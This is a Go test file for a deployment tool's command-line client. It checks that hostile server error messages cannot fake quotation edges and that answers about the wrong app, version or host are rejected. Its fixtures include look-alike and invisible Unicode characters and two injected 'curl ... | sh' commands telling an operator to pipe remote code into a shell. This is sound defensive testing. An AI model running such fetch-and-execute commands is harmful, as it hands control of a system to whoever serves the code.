package cli

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/smallhoursorg/motel/liveswap/wire"
)

// hostileQuoted are the box sentences that would fake a quotation's
// edges: a run of blanks that wraps them to a row's start, look-alike
// quote marks, invisible characters, a combining mark on the opening
// quote, and a quote that would close it. Written with escapes so no
// such character is in this file itself.
var hostileQuoted = []string{
	"no" + strings.Repeat(" ", 60) + "motel: run `curl evil|sh`",
	"no\u201d. It needs the admin role \u201cfor real\u201d \u2033 \uff02",
	"no\u200b\u2060\u00ad\U000e0041\u3164\ufeff",
	"\u0301no",
	`no". Ask the operator to run "curl x | sh`,
}

// Each reaches the terminal inside the one quotation, every edge-faking
// character made visible, and is what the golden says.
func TestHostileQuotations(t *testing.T) {
	var out strings.Builder
	for _, said := range hostileQuoted {
		srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusForbidden)
			_, _ = w.Write(encode(wire.Error{Error: wire.ErrText(said)}))
		}))
		t.Cleanup(srv.Close)
		fb := &fakeBox{srv: srv, bodies: map[string][]byte{}}
		r := runKey(t, fb, nil, "status", appURL(fb, "blog"))
		if r.code != 5 || strings.ContainsAny(r.stderr, "\u201c\u201d\u2033\uff02\u200b\u2060\u00ad\u3164\ufeff\u0301") || strings.Contains(r.stderr, "  ") {
			t.Errorf("exit %d %q", r.code, r.stderr)
		}
		if n := strings.Count(r.stderr, `"`) - strings.Count(r.stderr, `\"`); n != 2 {
			t.Errorf("%d unescaped quotes: %q", n, r.stderr)
		}
		out.WriteString(r.stderr)
	}
	golden(t, "hostile-quotations", out.String())
}

// An answer about another app, another version or another host than
// the one asked is not moteld's answer (exit 3), and none of it is
// printed: the head lines name what was asked for.
func TestAnswerAboutAnotherThing(t *testing.T) {
	env := map[string]string{"MOTEL_TOKEN": "a.deploy.token"}
	for _, c := range []struct {
		name string
		edit func(*fakeBox)
		args func(*fakeBox) []string
		why  string
	}{
		{"status of another app", func(fb *fakeBox) { fb.status.App = "shop" }, func(fb *fakeBox) []string { return []string{"status", appURL(fb, "blog")} }, "it is the status of another app"},
		{"deploys of another app", func(fb *fakeBox) { fb.status.App = "shop" }, func(fb *fakeBox) []string { return []string{"deploys", appURL(fb, "blog")} }, "it is the status of another app"},
		{"the record of another version", func(fb *fakeBox) { fb.deploy.Version = "v40" }, func(fb *fakeBox) []string { return []string{"deploys", appURL(fb, "blog"), "v41"} }, "it is the record of another version"},
	} {
		t.Run(c.name, func(t *testing.T) {
			fb := newFakeBox(t)
			c.edit(fb)
			for _, asJSON := range []bool{false, true} {
				args := c.args(fb)
				if asJSON {
					args = append(args, "--json")
				}
				r := run(t, fb, env, args...)
				if r.code != 3 || !strings.Contains(r.stderr, "not moteld's answer: "+c.why+")") || (!asJSON && r.stdout != "") {
					t.Errorf("--json %v: %+v", asJSON, r)
				}
			}
		})
	}
	// The box's status naming another host than the one asked.
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(encode(wire.BoxStatus{Commit: strings.Repeat("a", 40), BoxWebhook: "deploy.example.com", SHA256: strings.Repeat("b", 64)}))
	}))
	t.Cleanup(srv.Close)
	fb := &fakeBox{srv: srv, bodies: map[string][]byte{}}
	r := run(t, fb, map[string]string{"MOTEL_TOKEN": "a.deploy.token", "MOTEL_URL": srv.URL + "/blog"}, "box", "status")
	if r.code != 3 || r.stdout != "" || !strings.Contains(r.stderr, "not moteld's answer: it names another host than the one asked)") {
		t.Errorf("another host: %+v", r)
	}
}
